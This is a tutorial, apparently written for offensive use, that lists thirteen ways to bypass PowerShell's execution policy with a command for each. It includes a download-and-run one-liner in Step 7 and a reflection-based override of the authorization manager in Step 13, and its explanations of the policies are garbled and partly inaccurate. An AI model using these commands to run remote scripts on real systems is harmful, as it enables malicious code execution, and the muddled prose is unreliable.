<h1><b>Intro</b></h1>

PowerShell is an integral part of every windows. From hacker’s perspective, it can be an effective weapon. Even the best-laid plans can be destroyed by its execution policies. On the other hand, there are a number of strategies that can be used to circumvent the execution strategy of PowerShell. 

<h3><b>PowerShell Execution Policy Overview</b></h3>
The object of the execution regulations for the PowerShell is to monitor how to configure files are to be loaded and how scripts are executed. It is a safety feature which helps prevent the execution of malicious scripts. On windows computers, the rules can be set at the level of the computer, user level, and session level. It is necessary to remember that the execution protocol is not designed to be safe. It merely protects users from causing harm accidentally. It can be done in many ways. The execution policies are 7 steps that are the following:

Unrestricted: this is the main procedure for computers not running windows. It ensures that scripts are executed with an alert.

Restricted: for windows computers this is the main which blocks the execution of scripts but required individual actions. 

Bypass: this ensures that all the scripts will run and no alerts shown or given. 
All signed: the required a reputable the creator to sign all the scripts and arrangement files, including the ones that are generated on the local computer. 

Remote signed: this is one of the main default policies on the windows servers. Only files accessed out of the internet that need a signature. 

Default: in here it actually sets the main policy of implementation. 

Undefined: where the existing scope does not contain a policy package if everything is unknown, which are limited defaults to the execution regulations.

<h4><b>Step 1: Bypass Flag </b></h4>
The bypass flag: using this is maybe the simplest way to transfer the execution policy. Meanwhile the script will run without alerts.

{% highlight ruby %}
PowerShell.exe -ExecutionPolicy Bypass -File .\script.ps1
{% endhighlight %}

<h4><b>Step 2: Unrestricted Flag</b></h4>
Unrestricted flag: is close to the previous method. They are similar in executing the script. The only difference is that the script will run with alerts. 

{% highlight ruby %}
PowerShell.exe -ExecutionPolicy Unrestricted -File .\script.ps1
{% endhighlight %}

<h4><b>Step 3: Command Switch</b></h4>
Command switch: in order to issue instructions, we should use this method to execute straight the script. For basic scripts, this will work; however, the more complicated scripts it will typically make mistakes.

{% highlight ruby %}

PowerShell -command "Write-Host 'This is a test.'"

{% endhighlight %}


<h4><b>Step 4: Encoded Command Switch</b></h4>
Encoded command switch: Analogous to the previous method. This approach encodes the script as an encoded base string. in addition, being vague which will help eliminate parser mistakes. 

{% highlight ruby %}
$command = "Write-Host 'This is a test.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
{% endhighlight %}

<h4><b>Step 5: Invoke-Command</b></h4>
Invoke command: this method is good because when the PowerShell remote control is allowed, it should run the difficult commands against machines.

{% highlight ruby %}
invoke-command -scriptblock {Write-Host "This is a test."}
{% endhighlight %}

<h4><b>Step 6: Invoke-Expression</b></h4>
Invoke expression: here form can be used to pip and run the contents of our documents.

{% highlight ruby %}
Get-Content .\script.ps1 | Invoke-Expression
{% endhighlight %}

<h4><b>Step 7: Download from URL</b></h4>
Download from URL: powershell should run to install a script from the hacker’s computer or the internet and then run it without copying to the disk.

{% highlight ruby %}

PowerShell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"

{% endhighlight %}

<h4><b>Step 8: Paste</b></h4>
Another way to execution policy is to directly copy the script into the virtual copy and paste it. Hence, this is helpful for installing short scripts that are not too difficult.

{% highlight ruby %}
Write-Host "This is a test."
{% endhighlight %}

<h4><b>Step 9: Echo & Pipe</b></h4>
Echo and pipe: Reflecting the script to the normal powershell input.

{% highlight ruby %}
Echo Write-Host "This is a test." | PowerShell -noprofile -
{% endhighlight %}

<h4><b>Step 10: Read & Pipe</b></h4>
Read and pipe: reading the output of the script and pipe it to the normal powershell input, equivalent to the previous method.

{% highlight ruby %}
Get-Content .\script.ps1 | PowerShell -noprofile -
{% endhighlight %}

<h4><b>Step 11: Process Scope</b></h4>
Process of scope: The execution policy may be implemented at multiple stages, including the method that is actually managed. As with the current phase, we should change the execution policy.

{% highlight ruby %}
Set-ExecutionPolicy Bypass -Scope Process
{% endhighlight %}

<h4><b>Step 12: Current User Scope</b></h4>
Current user scope: this approach is identical to the procedure scope, except for the current user, it adjusts the execution strategy. This works under the hood by changing a registry key.

{% highlight ruby %}
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted
{% endhighlight %}

<h4><b>Step 13: Authorization Manager Swap</b></h4>
Swap of authorization manager: a functionality of PowerShell is effectively overridden by the final approach we would discuss. When the method is named the authorization manager feature; it will be replaced with a null number, which will lead to unregulated execution policy and allow the script to work.

{% highlight ruby %}
function Disable-ExecutionPolicy {($ctx = $executioncontext.gettype().getfield("_context","nonpublic,instance").getvalue( $executioncontext)).gettype().getfield("_authorizationManager","nonpublic,instance").setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager "Microsoft.PowerShell"))} Disable-ExecutionPolicy .\script.ps1
{% endhighlight %}
